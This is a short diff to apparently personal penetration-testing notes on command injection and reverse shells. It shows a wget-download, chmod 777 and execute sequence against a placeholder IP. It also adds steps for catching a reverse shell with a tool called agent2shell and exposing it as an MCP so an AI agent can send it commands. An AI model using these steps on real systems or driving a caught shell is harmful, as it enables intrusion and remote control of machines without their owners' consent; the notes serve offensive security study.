@@ -55,6 +55,11 @@ pagetitle: Command Injection & Reverse Shells
 - If we're restricted in characters, the best way to usually do it is to get a script on the system, and execute that
   - `wget {IP}:{port}/script.sh` -> `chmod 777 ./script.sh` -> `./script.sh`
 
+**Making our revshell an MCP**
+- Use Francisco's [agent2shell](https://github.com/0xmagic0/agent2shell), which sets up a binary that essentially catches the shell and allows anything to send commands to it
+  - `make build`, then add to PATH for easy usage 
+  - Catch shell with `agent2shell catch -p 4444`, then send commands with `agent2shell run '{command}'`
+
 **Upgrading Linux Shell to a Better Shell**
 - `script /dev/null -c bash`
   - Then background the existing shell with CTRL Z
